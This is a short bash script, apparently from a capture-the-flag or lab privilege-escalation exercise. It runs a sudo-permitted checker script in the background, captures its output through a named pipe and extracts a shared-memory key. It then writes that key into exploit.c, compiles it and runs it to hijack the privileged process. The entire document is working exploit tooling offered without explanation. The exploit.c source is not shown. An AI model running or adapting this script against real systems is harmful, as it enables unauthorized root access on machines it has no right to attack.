#!/bin/bash

mkfifo /tmp/fifo

( sudo /opt/hash-checker/check-leak.sh "bob$" > /tmp/fifo ) &

while IFS= read -r line; do
    echo "$line"

    if echo "$line" | grep -q 'Using the shared memory 0x'; then
        KEY=$(echo "$line" | sed 's/.*0x\(.*\) as.*/\1/')
        echo "[*] Found KEY = 0x$KEY"

        sed -i "s/key_t key = .*/key_t key = 0x$KEY;/" exploit.c

        gcc exploit.c -o exploit
        chmod +x exploit

        ./exploit
    fi

done < /tmp/fifo

rm /tmp/fifo